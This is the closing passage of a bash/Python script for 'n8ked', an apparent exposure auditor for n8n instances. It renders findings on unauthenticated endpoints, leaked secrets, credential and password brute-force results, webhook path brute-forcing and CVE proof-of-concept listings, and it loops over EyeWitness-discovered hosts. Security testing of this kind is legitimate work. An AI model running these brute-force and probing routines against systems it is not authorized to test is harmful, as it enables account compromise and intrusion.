        webhook_hits.append({"base": p[0], "path": p[1], "method": p[2], "verdict": p[3], "status": p[4]})

disclosure_headers = read_lines(env("N8KED_DISCLOSURE_FILE", ""))
brute_valid_count = len(read_lines(env("N8KED_BRUTEVALID_FILE", "")))

cve_pocs = []
for line in read_lines(env("N8KED_CVEPOC_FILE", "")):
    p = line.split("|", 6)
    if len(p) >= 7:
        cve_pocs.append({
            "id": p[0], "name": p[1], "cvss": p[2], "auth": p[3],
            "matched_via": p[4], "confirmed": p[4] == "nuclei",
            "preconditions": p[5],
            "command": p[6].replace("\x1f", "\n"),
        })

target = env("N8KED_TARGET", "")

if to_bool(env("N8KED_EMIT_JSON", "false")):
    obj = {
        "target": target,
        "version": env("N8KED_VERSION", ""),
        "instance_id": env("N8KED_INSTANCE_ID", ""),
        "auth_method": env("N8KED_AUTH_METHOD", ""),
        "mfa_enabled": env("N8KED_MFA_ENABLED", ""),
        "mfa_enforced": env("N8KED_MFA_ENFORCED", ""),
        "internal_hostname_disclosed": env("N8KED_INTERNAL_HOST", ""),
        "webhook_test_live": to_bool(env("N8KED_WEBHOOK_LIVE", "false")),
        "webhook_prod_live": to_bool(env("N8KED_WEBHOOK_PROD_LIVE", "false")),
        "disclosure_headers": disclosure_headers,
        "credential_test": env("N8KED_CRED_TEST", "not run"),
        "bruteforce": {
            "ran": to_bool(env("N8KED_BRUTE_RAN", "false")),
            "tried": int(env("N8KED_BRUTE_TRIED", "0") or 0),
            "total": int(env("N8KED_BRUTE_TOTAL", "0") or 0),
            "valid_count": brute_valid_count,
        },
        "lockout_check": env("N8KED_LOCKOUT", "not run"),
        "webhook_bruteforce": {
            "ran": to_bool(env("N8KED_WHBRUTE_RAN", "false")),
            "hits": webhook_hits,
        },
        "nuclei_ran": to_bool(env("N8KED_NUCLEI_RAN", "false")),
        "cve_check_ran": to_bool(env("N8KED_CVE_MODE", "false")),
        "cve_pocs": cve_pocs,
        "cors": env("N8KED_CORS", "none"),
        "endpoint_exposure": endpoints,
        "findings": findings,
    }
    # Single line, no embedded newlines: true JSONL regardless of host count.
    print(json.dumps(obj, separators=(",", ":")))

csv_path = env("N8KED_CSV_FILE", "")
if csv_path:
    with open(csv_path, "a", newline="") as f:
        w = csv.writer(f)
        if findings:
            for fnd in findings:
                w.writerow([target, fnd["severity"], fnd["category"], fnd["message"]])
        else:
            w.writerow([target, "INFO", "none", "No issues flagged."])
        src_label = {
            "nuclei": "confirmed via active nuclei probe",
            "version": "version-range match, NOT actively confirmed",
        }
        for poc in cve_pocs:
            label = src_label.get(poc["matched_via"], poc["matched_via"])
            msg = (poc["id"] + " (" + poc["name"] + ", CVSS " + poc["cvss"] + ") "
                   + "— " + label
                   + " — full PoC command in --json output")
            w.writerow([target, "INFO", "cve-poc", msg])
'
        else
            [[ "$JSON_OUT" == true ]] && echo "{\"target\":\"$TARGET\",\"error\":\"python3 not available — JSON/CSV output requires python3\"}"
        fi
        [[ "$JSON_OUT" == true ]] && return
    fi
    echo
    printf "%s%s /░ /░    /█▀▀█    /░/░    /█▀▀▀/    /░░░ %s\n" "$C_BOLD" "$C_MAG" "$C_RESET"
    printf "%s%s│ ▒▒ ▒   │ ▓▓▓▓   │ ▒▒/   │ ▓▓▓     │-▒_/▒%s\n" "$C_BOLD" "$C_MAG" "$C_RESET"
    printf "%s%s│ ▓│▓▓   │ ▒ /▒   │ ▓▓    │_▒_/     │ ▓│ ▓  n8ked — n8n exposure auditor%s\n" "$C_BOLD" "$C_MAG" "$C_RESET"
    printf "%s%s│ █│ █   │ ░░░░   │ █ █   │ ░░░░    │ ███/%s\n" "$C_BOLD" "$C_MAG" "$C_RESET"
    printf "%s%s│//│//   │/___/   │////   │/___/    │/__/ %s\n" "$C_BOLD" "$C_MAG" "$C_RESET"
    hr
    printf "%sTarget:%s %s    %sChecked:%s %s\n" "$C_BOLD" "$C_RESET" "$TARGET" "$C_BOLD" "$C_RESET" "$(date '+%Y-%m-%d %H:%M:%S %Z')"
    # ---------------------------------------------------------------
    # Scorecard — every check has already run and FINDINGS is fully
    # populated by this point, so the severity tally can be shown right
    # up front for at-a-glance triage instead of only at the bottom.
    # ---------------------------------------------------------------
    local sc_crit=0 sc_high=0 sc_med=0 sc_low=0 f_sc
    for f_sc in "${FINDINGS[@]}"; do
        IFS='|' read -r sc_sev _sc_cat _sc_msg <<< "$f_sc"
        case "$sc_sev" in
            CRIT) ((sc_crit++)) ;;
            HIGH) ((sc_high++)) ;;
            MED)  ((sc_med++))  ;;
            LOW)  ((sc_low++))  ;;
        esac
    done
    printf "%s%s%s\n" "$C_DIM" "$(printf '═%.0s' $(seq 1 74))" "$C_RESET"
    if [[ $((sc_crit + sc_high)) -gt 0 ]]; then
        printf "  %s%sCRITICAL %d%s   %sHIGH %d%s   %sMEDIUM %d%s   %sLOW %d%s\n" \
            "$C_BOLD" "$C_RED" "$sc_crit" "$C_RESET" \
            "$C_RED" "$sc_high" "$C_RESET" \
            "$C_YEL" "$sc_med" "$C_RESET" \
            "$C_DIM" "$sc_low" "$C_RESET"
    else
        printf "  %s%sNo Critical/High findings%s   %sMEDIUM %d%s   %sLOW %d%s\n" \
            "$C_BOLD" "$C_GRN" "$C_RESET" \
            "$C_YEL" "$sc_med" "$C_RESET" \
            "$C_DIM" "$sc_low" "$C_RESET"
    fi
    printf "%s%s%s\n" "$C_DIM" "$(printf '═%.0s' $(seq 1 74))" "$C_RESET"
    section "Instance Fingerprint"
    kv "HTTP root status"     "$ROOT_STATUS"
    kv "Server header"        "${SERVER_HDR:-none disclosed}"
    kv "n8n version (CLI)"    "$VERSION" "$C_YEL"
    kv "Release channel"      "$RELEASE_CHANNEL"
    kv "Instance ID"          "$INSTANCE_ID" "$C_DIM"
    kv "/healthz"             "$HEALTH_STATUS"
    footer
    section "Authentication & SSO"
    kv "Auth method"          "$AUTH_METHOD"
    kv "Setup already done"   "$( [[ "$SHOW_SETUP" == "false" ]] && echo "yes (admin exists)" || echo "NO — first-run setup may be open" )" \
        "$( [[ "$SHOW_SETUP" == "false" ]] && echo "$C_GRN" || echo "$C_RED" )"
    kv "MFA enabled"          "$MFA_ENABLED" "$( [[ "$MFA_ENABLED" == "true" ]] && echo "$C_GRN" || echo "$C_RED" )"
    kv "MFA enforced"         "$MFA_ENFORCED" "$( [[ "$MFA_ENFORCED" == "true" ]] && echo "$C_GRN" || echo "$C_RED" )"
    kv "SAML SSO"             "$SAML_ON"
    kv "LDAP"                 "$LDAP_ON"
    kv "OIDC SSO"             "$OIDC_ON"
    kv "Auth cookie 'secure'" "$AUTHCOOKIE_SECURE"
    footer
    section "Access Control — Unauthenticated Endpoint Exposure"
    printf "%s│%s  %-3s %-30s %-6s %-26s %s\n" "$C_CYN" "$C_RESET" "" "STATUS" "[CODE]" "ENDPOINT" "DESCRIPTION"
    for e in "${ENDPOINT_RESULTS[@]}"; do
        IFS='|' read -r ep label verdict status <<< "$e"
        case "$verdict" in
            EXPOSED)
                printf "%s│%s  %s✗%s  %s%-30s%s %-6s %-26s %s(%s)%s\n" \
                    "$C_CYN" "$C_RESET" "$C_RED" "$C_RESET" "$C_RED" "ACCESSIBLE WITHOUT AUTH" "$C_RESET" "[$status]" "$ep" "$C_DIM" "$label" "$C_RESET" ;;
            PROTECTED)
                printf "%s│%s  %s✓%s  %s%-30s%s %-6s %-26s %s(%s)%s\n" \
                    "$C_CYN" "$C_RESET" "$C_GRN" "$C_RESET" "$C_GRN" "PROTECTED — AUTH REQUIRED" "$C_RESET" "[$status]" "$ep" "$C_DIM" "$label" "$C_RESET" ;;
            EMPTY)
                printf "%s│%s  %s✓%s  %s%-30s%s %-6s %-26s %s(%s)%s\n" \
                    "$C_CYN" "$C_RESET" "$C_GRN" "$C_RESET" "$C_WHT" "REACHABLE, NO DATA RETURNED" "$C_RESET" "[$status]" "$ep" "$C_DIM" "$label" "$C_RESET" ;;
            NOT-ENABLED)
                printf "%s│%s  %s-%s  %s%-30s%s %-6s %-26s %s(%s)%s\n" \
                    "$C_CYN" "$C_RESET" "$C_DIM" "$C_RESET" "$C_DIM" "NOT ENABLED" "$C_RESET" "[$status]" "$ep" "$C_DIM" "$label" "$C_RESET" ;;
            *)
                printf "%s│%s  %s?%s  %s%-30s%s %-6s %-26s %s(%s)%s\n" \
                    "$C_CYN" "$C_RESET" "$C_YEL" "$C_RESET" "$C_YEL" "UNKNOWN — REVIEW MANUALLY" "$C_RESET" "[$status]" "$ep" "$C_DIM" "$label" "$C_RESET" ;;
        esac
    done
    footer
    if [[ ${#SECRET_HITS[@]} -gt 0 ]]; then
        section "Secret Scan"
        for hit in "${SECRET_HITS[@]}"; do
            IFS='|' read -r stype slabel sval <<< "$hit"
            printf "%s│%s  %s✗ %s%s in %s: %s%s%s\n" "$C_CYN" "$C_RESET" "$C_RED" "$stype" "$C_RESET" "$slabel" "$C_BOLD" "$sval" "$C_RESET"
        done
        [[ "$REVEAL_SECRETS" == false ]] && printf "%s│%s  %s(values masked — rerun with --reveal-secrets to see full values)%s\n" "$C_CYN" "$C_RESET" "$C_DIM" "$C_RESET"
        footer
    fi
    if [[ ${#DISCLOSURE_HDRS[@]} -gt 0 ]]; then
        section "Header Disclosure"
        for h in "${DISCLOSURE_HDRS[@]}"; do
            printf "%s│%s  %s⚠ %s%s\n" "$C_CYN" "$C_RESET" "$C_YEL" "$h" "$C_RESET"
        done
        footer
    fi
    section "Security Headers & Transport"
    kv "TLS"                  "$( [[ "$IS_HTTPS" == true ]] && echo "https" || echo "plain HTTP" )" "$( [[ "$IS_HTTPS" == true ]] && echo "$C_GRN" || echo "$C_RED" )"
    kv "Strict-Transport-Security" "$HAS_HSTS"
    kv "X-Frame-Options"      "$HAS_XFO"
    kv "X-Content-Type-Options" "$HAS_XCTO"
    kv "Content-Security-Policy" "$HAS_CSP"
    kv "CORS (probe origin)"  "$CORS_VERDICT"
    footer
    if [[ ${#EXPOSED_FILES[@]} -gt 0 ]]; then
        section "Possible Config/File Exposure"
        for p in "${EXPOSED_FILES[@]}"; do
            printf "%s│%s  %s⚠ %s%s returned distinct HTTP 200 content — verify manually\n" "$C_CYN" "$C_RESET" "$C_YEL" "$p" "$C_RESET"
        done
        footer
    fi
    section "Other Disclosure"
    if [[ -n "$INTERNAL_HOST" ]]; then
        printf "%s│%s  %s⚠ Internal hostname disclosed:%s %s\n" "$C_CYN" "$C_RESET" "$C_YEL" "$C_RESET" "$INTERNAL_HOST"
    else
        printf "%s│%s  %s✓ No internal hostname found in OAuth/OIDC callback URLs%s\n" "$C_CYN" "$C_RESET" "$C_GRN" "$C_RESET"
    fi
    kv "Telemetry enabled"    "$TELEMETRY_ON"
    if [[ "$WEBHOOK_LIVE" == true ]]; then
        printf "%s│%s  %s⚠ Webhook test endpoint live (HTTP %s, distinct content)%s\n" "$C_CYN" "$C_RESET" "$C_YEL" "$WEBHOOK_STATUS" "$C_RESET"
    else
        printf "%s│%s  %s✓ Webhook test path not live (HTTP %s)%s\n" "$C_CYN" "$C_RESET" "$C_GRN" "${WEBHOOK_STATUS:-n/a}" "$C_RESET"
    fi
    if [[ "$WEBHOOK_PROD_LIVE" == true ]]; then
        printf "%s│%s  %s⚠ PRODUCTION webhook base (/webhook/) live (HTTP %s, distinct content)%s\n" "$C_CYN" "$C_RESET" "$C_RED" "$WEBHOOK_PROD_STATUS" "$C_RESET"
    else
        printf "%s│%s  %s✓ Production webhook base not live (HTTP %s)%s\n" "$C_CYN" "$C_RESET" "$C_GRN" "${WEBHOOK_PROD_STATUS:-n/a}" "$C_RESET"
    fi
    footer
    if [[ -n "$TEST_CRED" || -n "$USERPASS_FILE" || "$CHECK_LOCKOUT" == true ]]; then
        section "Credential Testing"
        if [[ -n "$TEST_CRED" ]]; then
            kv "Single cred tested" "${TEST_CRED%%:*}"
            case "$CRED_RESULT" in
                success) printf "%s│%s  %s✗ Login SUCCEEDED — valid credentials%s\n" "$C_CYN" "$C_RESET" "$C_RED" "$C_RESET" ;;
                fail)    printf "%s│%s  %s✓ Login rejected (401)%s\n" "$C_CYN" "$C_RESET" "$C_GRN" "$C_RESET" ;;
                *)       printf "%s│%s  %s⚠ Unexpected response — review manually%s\n" "$C_CYN" "$C_RESET" "$C_YEL" "$C_RESET" ;;
            esac
        fi
        if [[ -n "$USERPASS_FILE" ]]; then
            kv "Brute force" "$BRUTE_TRIED/$BRUTE_TOTAL pair(s) tried, ${#BRUTE_VALID[@]} valid"
            for v in "${BRUTE_VALID[@]}"; do
                printf "%s│%s  %s✗ VALID: %s%s\n" "$C_CYN" "$C_RESET" "$C_RED" "${v%%:*}" "$C_RESET"
            done
        fi
        if [[ "$CHECK_LOCKOUT" == true ]]; then
            case "$LOCKOUT_RESULT" in
                throttled)     printf "%s│%s  %s✓ /rest/login throttled (HTTP 429 observed) during 8 rapid attempts%s\n" "$C_CYN" "$C_RESET" "$C_GRN" "$C_RESET" ;;
                not-throttled) printf "%s│%s  %s⚠ No throttling observed on /rest/login after 8 rapid attempts%s\n" "$C_CYN" "$C_RESET" "$C_YEL" "$C_RESET" ;;
            esac
        fi
        footer
    fi
    if [[ -n "$WEBHOOK_BRUTE_FILE" ]]; then
        section "Webhook Path Discovery"
        if [[ ${#WEBHOOK_BRUTE_HITS[@]} -eq 0 ]]; then
            printf "%s│%s  %s✓ No registered webhook paths found among %s candidate(s)%s\n" "$C_CYN" "$C_RESET" "$C_GRN" "$(grep -cve '^[[:space:]]*$' "$WEBHOOK_BRUTE_FILE" 2>/dev/null || echo 0)" "$C_RESET"
        else
            for hit in "${WEBHOOK_BRUTE_HITS[@]}"; do
                IFS='|' read -r hbase hcand hmethod hverdict hstatus <<< "$hit"
                printf "%s│%s  %s✗ %s%s [%s] /%s/%s (%s)%s\n" "$C_CYN" "$C_RESET" "$C_RED" "$hverdict" "$C_RESET" "$hstatus" "$hbase" "$hcand" "$hmethod" "$C_RESET"
            done
        fi
        footer
    fi
    if [[ "$RUN_NUCLEI" == true ]]; then
        section "nuclei (tag: n8n)"
        if [[ -z "$NUCLEI_OUT" ]]; then
            printf "%s│%s  %s✓ No matches%s\n" "$C_CYN" "$C_RESET" "$C_GRN" "$C_RESET"
        else
            echo "$NUCLEI_OUT" | while IFS= read -r line; do
                printf "%s│%s  %s\n" "$C_CYN" "$C_RESET" "$line"
            done
        fi
        footer
    else
        echo
        printf "%s(known-CVE check skipped — rerun with --nuclei to check the detected version against nuclei's n8n-tagged CVE templates)%s\n" "$C_DIM" "$C_RESET"
    fi
    if [[ "$CVE_MODE" == true ]]; then
        echo
        printf "%s%sCVE Proof-of-Concept%s\n" "$C_BOLD" "$C_YEL" "$C_RESET"
        if [[ ${#CVE_POC_ROWS[@]} -eq 0 ]]; then
            printf "  %s✓ No known-CVE version ranges matched (detected version: %s)%s\n" "$C_GRN" "$VERSION" "$C_RESET"
        else
            printf "  %sPoC commands only ever get PRINTED, never run. Confirm scope before running any of it.%s\n" "$C_DIM" "$C_RESET"
            local ci
            for ci in "${!CVE_POC_ROWS[@]}"; do
                local dbi="${CVE_POC_ROWS[$ci]}" src="${CVE_POC_SOURCES[$ci]}"
                local pocsev sevtag sevcolor
                pocsev=$(cvss_to_sev "${CVE_DB_CVSS[$dbi]}")
                case "$pocsev" in
                    CRIT) sevtag="CRITICAL"; sevcolor="$C_RED$C_BOLD" ;;
                    HIGH) sevtag="HIGH";     sevcolor="$C_RED" ;;
                    MED)  sevtag="MEDIUM";   sevcolor="$C_YEL" ;;
                    *)    sevtag="LOW";      sevcolor="$C_DIM" ;;
                esac
                echo
                printf "  %s[%s]%s %s%s%s — %s\n" "$sevcolor" "$sevtag" "$C_RESET" "$C_BOLD" "${CVE_DB_ID[$dbi]}" "$C_RESET" "${CVE_DB_NAME[$dbi]}"
                printf "      %sCVSS %s · %s · matched via: %s%s\n" "$C_DIM" "${CVE_DB_CVSS[$dbi]}" "${CVE_DB_AUTH[$dbi]}" "$(cve_src_label "$src")" "$C_RESET"
                wrap_flat "      " "Preconditions: " "${CVE_DB_NOTE[$dbi]}"
                printf "      %sCommand:%s\n" "$C_DIM" "$C_RESET"
                local cmdtext="${CVE_DB_CMD[$dbi]//\{\{TARGET\}\}/$TARGET}"
                while IFS= read -r cmdline; do
                    printf "        %s%s%s\n" "$C_GRN" "$cmdline" "$C_RESET"
                done <<< "$cmdtext"
            done
        fi
    fi
    # -------------------------------------------------------------------
    # Risk summary
    # -------------------------------------------------------------------
    local n_crit=0 n_high=0 n_med=0 n_low=0
    echo
    printf "%s%sRisk Summary%s\n" "$C_BOLD" "$C_YEL" "$C_RESET"
    for f in "${FINDINGS[@]}"; do
        IFS='|' read -r sev _cat msg <<< "$f"
        case "$sev" in
            CRIT) ((n_crit++)); printf "  %s[CRITICAL]%s %s\n" "$C_RED$C_BOLD" "$C_RESET" "$msg" ;;
        esac
    done
    for f in "${FINDINGS[@]}"; do
        IFS='|' read -r sev _cat msg <<< "$f"
        case "$sev" in
            HIGH) ((n_high++)); printf "  %s[HIGH]%s     %s\n" "$C_RED" "$C_RESET" "$msg" ;;
        esac
    done
    for f in "${FINDINGS[@]}"; do
        IFS='|' read -r sev _cat msg <<< "$f"
        case "$sev" in
            MED)  ((n_med++));  printf "  %s[MEDIUM]%s   %s\n" "$C_YEL" "$C_RESET" "$msg" ;;
        esac
    done
    for f in "${FINDINGS[@]}"; do
        IFS='|' read -r sev _cat msg <<< "$f"
        case "$sev" in
            LOW)  ((n_low++));  printf "  %s[LOW]%s      %s\n" "$C_DIM" "$C_RESET" "$msg" ;;
        esac
    done
    if [[ ${#FINDINGS[@]} -eq 0 ]]; then
        printf "  %sNo issues flagged.%s\n" "$C_GRN" "$C_RESET"
    fi
    echo
    printf "%s%d critical, %d high, %d medium, %d low%s\n" "$C_BOLD" "$n_crit" "$n_high" "$n_med" "$n_low" "$C_RESET"
    echo
    if [[ $((n_crit + n_high)) -gt 0 ]]; then
        HAD_HIGH_OR_CRIT=true
    fi
}
# ---------------------------------------------------------------------------
# EyeWitness folder discovery — pulls every URL EyeWitness saw
# (open_ports.csv rows, plus any href="http(s)://..." in report*.html) and
# probes each origin's /rest/settings for an n8n instanceId before handing
# confirmed hits to scan_target. Non-n8n hosts are skipped silently rather
# than being run through the full audit.
# ---------------------------------------------------------------------------
EW_PYTHON_EXTRACTOR='
import csv, glob, os, re, sys
d = sys.argv[1]
origins = set()
csv_path = os.path.join(d, "open_ports.csv")
if os.path.isfile(csv_path):
    with open(csv_path, newline="", errors="ignore") as f:
        rows = list(csv.reader(f))
    for row in rows[1:]:
        if not row:
            continue
        url = row[0].strip()
        m = re.match(r"^(https?://[^/]+)", url)
        if m:
            origins.add(m.group(1))
for path in glob.glob(os.path.join(d, "report*.html")):
    try:
        with open(path, "r", errors="ignore") as f:
            html = f.read()
    except Exception:
        continue
    for m in re.finditer(r"href=\"(https?://[^\"/]+)[^\"]*\"", html):
        origins.add(m.group(1))
for o in sorted(origins):
    print(o)
'
discover_eyewitness_candidates() {
    # discover_eyewitness_candidates <dir> -> writes unique origins to stdout
    local dir="$1"
    if [[ "$HAVE_PY" == true ]]; then
        python3 -c "$EW_PYTHON_EXTRACTOR" "$dir" 2>/dev/null
    else
        # Fallback: open_ports.csv only (no python3 available for HTML parsing)
        if [[ -f "$dir/open_ports.csv" ]]; then
            tail -n +2 "$dir/open_ports.csv" | awk -F',' '{print $1}' | tr -d '\r' \
                | grep -oE '^https?://[^/]+'
        fi
    fi | sort -u
}
# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
HAD_HIGH_OR_CRIT=false
NOT_N8N_SEEN=false
if [[ -n "$CSV_OUT_FILE" ]]; then
    echo "target,severity,category,message" > "$CSV_OUT_FILE"
fi
if [[ -n "$EW_DIR" ]]; then
    [[ -d "$EW_DIR" ]] || { echo "Error: not a directory: $EW_DIR" >&2; exit 1; }
    CAND_FILE="$TMPDIR/ew_candidates.txt"
    discover_eyewitness_candidates "$EW_DIR" > "$CAND_FILE"
    TOTAL_CAND=$(wc -l < "$CAND_FILE" | tr -d ' ')
    echo "[n8ked] Parsed EyeWitness data: $TOTAL_CAND candidate host(s). Probing for n8n..." >&2
    FOUND=0
    while IFS= read -r origin; do
        [[ -z "$origin" ]] && continue
        probe=$(curl -skL --max-time 6 "$origin/rest/settings" 2>/dev/null)
        if echo "$probe" | grep -qE '"instanceId"|"settingsMode"|"userManagement"'; then
            FOUND=$((FOUND + 1))
            echo "[n8ked]   -> n8n confirmed: $origin" >&2
            scan_target "$origin"
        fi
    done < "$CAND_FILE"
    echo "[n8ked] Done. $FOUND n8n instance(s) found out of $TOTAL_CAND candidate(s)." >&2
    if [[ "$FOUND" -eq 0 ]]; then
        NOT_N8N_SEEN=true
    fi
elif [[ -n "$TARGET_FILE" ]]; then
    [[ -f "$TARGET_FILE" ]] || { echo "Error: file not found: $TARGET_FILE" >&2; exit 1; }
    while IFS= read -r line; do
        line="$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
        [[ -z "$line" || "$line" == \#* ]] && continue
        scan_target "$line"
    done < "$TARGET_FILE"
else
    scan_target "$TARGET"
fi
if [[ "$HAD_HIGH_OR_CRIT" == true ]]; then
    exit 1
elif [[ "$NOT_N8N_SEEN" == true ]]; then
    exit 2
fi
exit 0
